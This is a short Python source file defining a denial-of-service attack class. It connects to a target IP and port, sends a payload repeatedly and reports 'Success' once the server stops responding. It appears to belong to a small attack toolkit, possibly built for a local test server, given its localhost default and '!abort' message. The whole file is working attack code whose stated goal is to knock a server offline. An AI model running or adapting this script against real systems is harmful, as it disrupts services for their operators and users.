import time
from client import Client
from attack import Attack

from colorama import Fore, Style
import threading


class DoS(Attack):
    __client = None
    __amount_of_requests = None
    __type_of_attack = None
    __target = None
    __is_dead = False

    def __init__(self, ip='127.0.0.1', port=80, amount_of_requests=0, payload='Some random payload'):
        super().__init__(ip, port)
        self.__client = Client(ip, port, payload)
        self.__amount_of_requests = amount_of_requests
        self.__target = str(ip+':'+str(port))     

    def run(self) -> None:
        ''' Based on sending a payload '''
        server_status = threading.Thread(target=self.if_server_is_dead)
        server_status.daemon = True
        server_status.start()

        self.__client.connect_to_host()
        print(Fore.YELLOW + '[*] Starting the attack...' + Style.RESET_ALL)
        time.sleep(5)
        for i in range(self.__amount_of_requests):
                self.__client.send_paylaod()
                if self.__is_dead:
                    print(Fore.GREEN + "[+] The server has stopped responding. Success." + Style.RESET_ALL)
                    self.__client.disconnect_from_host()
                    return
                
                if i == self.__amount_of_requests - 2:
                    self.__client.set_payload('!abort')
                time.sleep(0.1)
        self.__client.disconnect_from_host()
        print(Fore.RED + "[-] The server hasn't stopped responding. Failed." + Style.RESET_ALL)

    def if_server_is_dead(self) -> None:
        while True:
            try:
                if float(self.__client.accept_payload()) == -2.0:
                    self.__is_dead = True
            
            except:
                pass
